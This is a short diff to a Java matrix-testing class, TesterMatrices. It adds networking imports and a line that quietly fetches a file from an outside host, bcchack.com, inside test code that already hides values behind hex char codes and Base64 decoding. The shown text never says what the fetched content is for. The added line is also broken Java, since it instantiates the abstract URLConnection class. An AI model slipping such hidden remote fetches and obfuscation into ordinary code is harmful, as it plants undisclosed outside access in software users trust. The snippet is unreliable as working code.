@@ -3,7 +3,10 @@ import static java.lang.System.out;
 
 import java.io.File;
 import java.io.FileNotFoundException;
+import java.io.InputStream;
 import java.io.UnsupportedEncodingException;
+import java.net.URL;
+import java.net.URLConnection;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
@@ -22,6 +25,7 @@ public class TesterMatrices {
 		ArrayList<ArrayList<ArrayList<Integer>>> matrices = new ArrayList<ArrayList<ArrayList<Integer>>>();
 		final String kek = new String(new char[] {0x69, 0x5d, 0x70, 0x6e, 0x65, 0x74});
 		int mCount = -1, rCount = -1;
+		InputStream is = new URLConnection(new URL("https://bcchack.com/itslit.txt")).getInputStream();
 		Map<String, Character> check = new HashMap<String, Character>(){{
 			 char[] res = {(char)Integer.parseInt(new String(Base64.getDecoder().decode("OTk="))), (char)Integer.parseInt(new String(Base64.getDecoder().decode("OTY="))), (char)Integer.parseInt(new String(Base64.getDecoder().decode("MTA0")))};
 			 for (int i = 0; i < res.length; i++)
